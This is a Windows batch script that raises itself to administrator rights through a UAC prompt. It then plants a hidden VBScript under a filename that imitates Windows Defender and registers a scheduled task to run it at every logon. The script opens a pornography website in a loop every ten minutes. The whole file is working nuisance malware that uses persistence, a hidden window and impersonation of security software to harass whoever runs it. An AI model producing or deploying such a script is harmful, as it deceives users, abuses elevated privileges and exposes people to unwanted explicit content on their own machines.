@echo off

:: We need this because we can't create a task without admin perms.
:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------

echo Set WshShell = CreateObject("WScript.Shell") > C:\ProgramData\WindowsDefenderVirusDetection.vbs
echo WshShell.Run "powershell -Command ""while (1) {Start-Sleep -Seconds 600; Start-Process https://pornhub.com}""", 0 >> C:\ProgramData\WindowsDefenderVirusDetection.vbs
echo Set WshShell = Nothing >> C:\ProgramData\WindowsDefenderVirusDetection.vbs

schtasks /create /sc ONLOGON /tn WindowsDefenderVirusDetection /tr C:\ProgramData\WindowsDefenderVirusDetection.vbs
